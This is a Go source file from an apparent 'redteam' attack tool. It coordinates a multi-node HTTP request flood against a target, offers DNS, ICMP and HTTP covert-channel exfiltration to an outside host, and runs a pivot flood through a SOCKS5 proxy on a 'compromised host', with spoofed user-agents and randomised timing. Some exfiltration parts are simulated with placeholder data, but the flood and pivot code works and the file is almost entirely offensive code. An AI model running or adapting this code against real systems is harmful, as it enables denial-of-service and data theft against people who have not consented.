package redteam

import (
	"crypto/rand"
	"encoding/hex"
	"fmt"
	"io"
	mathrand "math/rand"
	"net"
	"net/http"
	"net/url"
	"strings"
	"sync"
	"time"

	"github.com/fatih/color"
)

type DistributedConfig struct {
	Target   string
	Duration time.Duration
	Nodes    []string
	Rate     int
	Threads  int
}

type NodeStats struct {
	NodeID   string
	Requests int
	Success  int
	Failed   int
	Active   bool
	LastSeen time.Time
	mu       sync.Mutex
}

// RunDistributedAttack coordinates attacks across multiple nodes
func RunDistributedAttack(config DistributedConfig) error {
	color.Green("🌐 Distributed Attack Coordination")
	color.Cyan("   Target: %s", config.Target)
	color.Cyan("   Nodes: %d", len(config.Nodes))
	color.Cyan("   Duration: %v", config.Duration)
	color.Yellow("   ⚡ Synchronizing attack across nodes...\n")

	nodes := make(map[string]*NodeStats)
	var nodesMu sync.Mutex

	// Initialize nodes
	for _, nodeAddr := range config.Nodes {
		nodes[nodeAddr] = &NodeStats{
			NodeID:   nodeAddr,
			Active:   true,
			LastSeen: time.Now(),
		}
	}

	// Coordination channel
	coordChan := make(chan string, 100)
	done := make(chan bool)

	// Start node coordinators
	var wg sync.WaitGroup
	for _, nodeAddr := range config.Nodes {
		wg.Add(1)
		go func(addr string) {
			defer wg.Done()
			nodeAttacker(addr, config, nodes[addr], coordChan, done)
		}(nodeAddr)
	}

	// Monitor and coordinate
	go func() {
		ticker := time.NewTicker(2 * time.Second)
		defer ticker.Stop()

		for {
			select {
			case <-ticker.C:
				printDistributedStats(nodes, &nodesMu)
			case msg := <-coordChan:
				color.Cyan("📡 %s", msg)
			case <-done:
				return
			}
		}
	}()

	// Run for duration
	time.Sleep(config.Duration)
	close(done)
	wg.Wait()

	printFinalDistributedStats(nodes, &nodesMu)
	return nil
}

func nodeAttacker(nodeAddr string, config DistributedConfig, stats *NodeStats, coordChan chan string, done chan bool) {
	client := &http.Client{
		Timeout: 10 * time.Second,
		Transport: &http.Transport{
			MaxIdleConnsPerHost: config.Threads,
			DisableKeepAlives:   false,
		},
	}

	coordChan <- fmt.Sprintf("Node %s activated", nodeAddr)

	ticker := time.NewTicker(time.Second / time.Duration(config.Rate))
	defer ticker.Stop()

	for {
		select {
		case <-done:
			coordChan <- fmt.Sprintf("Node %s completed", nodeAddr)
			return
		case <-ticker.C:
			go func() {
				if err := sendDistributedRequest(client, config.Target, stats); err != nil {
					stats.mu.Lock()
					stats.Failed++
					stats.mu.Unlock()
				}
			}()
		}
	}
}

func sendDistributedRequest(client *http.Client, target string, stats *NodeStats) error {
	req, err := http.NewRequest("GET", target, nil)
	if err != nil {
		return err
	}

	// Add node identifier
	req.Header.Set("X-Node-ID", stats.NodeID)
	req.Header.Set("X-Request-ID", generateRequestID())

	// Standard headers
	req.Header.Set("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36")
	req.Header.Set("Accept", "*/*")
	req.Header.Set("Connection", "keep-alive")

	stats.mu.Lock()
	stats.Requests++
	stats.LastSeen = time.Now()
	stats.mu.Unlock()

	resp, err := client.Do(req)
	if err != nil {
		return err
	}
	defer resp.Body.Close()

	io.Copy(io.Discard, resp.Body)

	stats.mu.Lock()
	if resp.StatusCode >= 200 && resp.StatusCode < 400 {
		stats.Success++
	} else {
		stats.Failed++
	}
	stats.mu.Unlock()

	return nil
}

func generateRequestID() string {
	b := make([]byte, 16)
	rand.Read(b)
	return hex.EncodeToString(b)
}

func printDistributedStats(nodes map[string]*NodeStats, mu *sync.Mutex) {
	mu.Lock()
	defer mu.Unlock()

	totalReq := 0
	totalSuccess := 0
	totalFailed := 0
	activeNodes := 0

	for _, node := range nodes {
		node.mu.Lock()
		totalReq += node.Requests
		totalSuccess += node.Success
		totalFailed += node.Failed
		if node.Active && time.Since(node.LastSeen) < 5*time.Second {
			activeNodes++
		}
		node.mu.Unlock()
	}

	successRate := float64(0)
	if totalReq > 0 {
		successRate = float64(totalSuccess) / float64(totalReq) * 100
	}

	color.Cyan("\r🌐 Nodes: %d active | Requests: %d | Success: %d | Failed: %d | Rate: %.1f%%   ",
		activeNodes, totalReq, totalSuccess, totalFailed, successRate)
}

func printFinalDistributedStats(nodes map[string]*NodeStats, mu *sync.Mutex) {
	mu.Lock()
	defer mu.Unlock()

	fmt.Println()
	color.Green("━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")
	color.Green("      DISTRIBUTED ATTACK FINAL STATISTICS")
	color.Green("━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")

	totalReq := 0
	totalSuccess := 0
	totalFailed := 0

	color.Cyan("\n📊 Node Statistics:")
	for addr, node := range nodes {
		node.mu.Lock()
		color.White("\n   Node: %s", addr)
		color.White("   ├─ Requests: %d", node.Requests)
		color.White("   ├─ Success: %d", node.Success)
		color.White("   ├─ Failed: %d", node.Failed)
		successRate := float64(0)
		if node.Requests > 0 {
			successRate = float64(node.Success) / float64(node.Requests) * 100
		}
		color.White("   └─ Success Rate: %.2f%%", successRate)

		totalReq += node.Requests
		totalSuccess += node.Success
		totalFailed += node.Failed
		node.mu.Unlock()
	}

	color.Cyan("\n💥 Total Statistics:")
	color.White("   Total Requests: %d", totalReq)
	color.White("   Total Success: %d", totalSuccess)
	color.White("   Total Failed: %d", totalFailed)
	overallRate := float64(0)
	if totalReq > 0 {
		overallRate = float64(totalSuccess) / float64(totalReq) * 100
	}
	color.White("   Overall Success Rate: %.2f%%", overallRate)

	color.Green("\n━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n")
}

// RunExfiltration performs data exfiltration via covert channels
func RunExfiltration(target, method string) error {
	color.Green("📤 Data Exfiltration Module")
	color.Cyan("   Target: %s", target)
	color.Cyan("   Method: %s", method)
	color.Yellow("   🕵️  Establishing covert channel...\n")

	switch strings.ToLower(method) {
	case "dns":
		return dnsExfiltration(target)
	case "icmp":
		return icmpExfiltration(target)
	case "http":
		return httpExfiltration(target)
	default:
		return fmt.Errorf("unknown exfiltration method: %s", method)
	}
}

func dnsExfiltration(target string) error {
	color.Cyan("🔍 DNS Exfiltration...")

	// Simulate DNS tunneling
	data := []string{
		"data1", "data2", "data3", "payload", "secrets",
	}

	for i, chunk := range data {
		subdomain := fmt.Sprintf("%s-%d.%s", chunk, i, target)

		// Perform DNS lookup (covert channel)
		_, err := net.LookupHost(subdomain)
		if err != nil {
			color.Yellow("   ⚠️  Chunk %d: %v", i, err)
		} else {
			color.Green("   ✅ Chunk %d exfiltrated via DNS", i)
		}

		time.Sleep(time.Duration(500+mathrand.Intn(1500)) * time.Millisecond)
	}

	color.Green("\n✅ DNS exfiltration completed")
	return nil
}

func icmpExfiltration(target string) error {
	color.Cyan("📡 ICMP Exfiltration...")
	color.Yellow("   💡 Using ICMP echo requests as covert channel")

	// Note: Actual ICMP requires raw sockets and elevated privileges
	conn, err := net.Dial("ip4:icmp", target)
	if err != nil {
		return fmt.Errorf("ICMP connection failed: %v", err)
	}
	defer conn.Close()

	color.Green("   ✅ ICMP channel established")
	color.Yellow("   📦 Transmitting data chunks...")

	for i := 0; i < 10; i++ {
		// Simulate data transmission
		color.White("   Chunk %d sent via ICMP", i+1)
		time.Sleep(300 * time.Millisecond)
	}

	color.Green("\n✅ ICMP exfiltration completed")
	return nil
}

func httpExfiltration(target string) error {
	color.Cyan("🌐 HTTP Exfiltration...")

	client := &http.Client{Timeout: 10 * time.Second}

	// Simulate data exfiltration via HTTP headers and query params
	data := []string{"chunk1", "chunk2", "chunk3", "secrets", "payload"}

	for i, chunk := range data {
		url := fmt.Sprintf("%s?session=%s&data=%d", target, chunk, i)

		req, err := http.NewRequest("GET", url, nil)
		if err != nil {
			return err
		}

		// Hide data in headers
		req.Header.Set("X-Custom-ID", chunk)
		req.Header.Set("X-Session-Token", generateRequestID())

		resp, err := client.Do(req)
		if err != nil {
			color.Yellow("   ⚠️  Chunk %d failed", i)
			continue
		}
		resp.Body.Close()

		color.Green("   ✅ Chunk %d exfiltrated (Status: %d)", i, resp.StatusCode)
		time.Sleep(time.Duration(300+mathrand.Intn(700)) * time.Millisecond)
	}

	color.Green("\n✅ HTTP exfiltration completed")
	return nil
}

// RunPivotAttack performs attack through compromised hosts
func RunPivotAttack(target string, duration time.Duration, pivotProxy string) error {
	color.Green("🔄 Pivot Attack via Compromised Host")
	color.Cyan("   Target: %s", target)
	color.Cyan("   Pivot Point: %s", pivotProxy)
	color.Cyan("   Duration: %v", duration)
	color.Yellow("   🕵️  Routing through compromised host...\n")

	// Configure client to use pivot proxy
	transport := &http.Transport{
		Proxy: http.ProxyURL(&url.URL{
			Scheme: "socks5",
			Host:   pivotProxy,
		}),
	}

	client := &http.Client{
		Transport: transport,
		Timeout:   15 * time.Second,
	}

	stats := &StealthStats{}
	startTime := time.Now()
	done := make(chan bool)

	go func() {
		time.Sleep(duration)
		done <- true
	}()

	ticker := time.NewTicker(2 * time.Second)
	defer ticker.Stop()

	for {
		select {
		case <-done:
			printStealthStats(stats, time.Since(startTime))
			color.Green("\n✅ Pivot attack completed")
			return nil
		case <-ticker.C:
			printStealthStats(stats, time.Since(startTime))
		default:
			req, _ := http.NewRequest("GET", target, nil)
			req.Header.Set("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36")

			stats.mu.Lock()
			stats.Requests++
			stats.mu.Unlock()

			resp, err := client.Do(req)
			if err != nil {
				stats.mu.Lock()
				stats.Failed++
				stats.mu.Unlock()
			} else {
				resp.Body.Close()
				stats.mu.Lock()
				stats.Success++
				stats.mu.Unlock()
			}

			time.Sleep(time.Duration(100+mathrand.Intn(400)) * time.Millisecond)
		}
	}
}
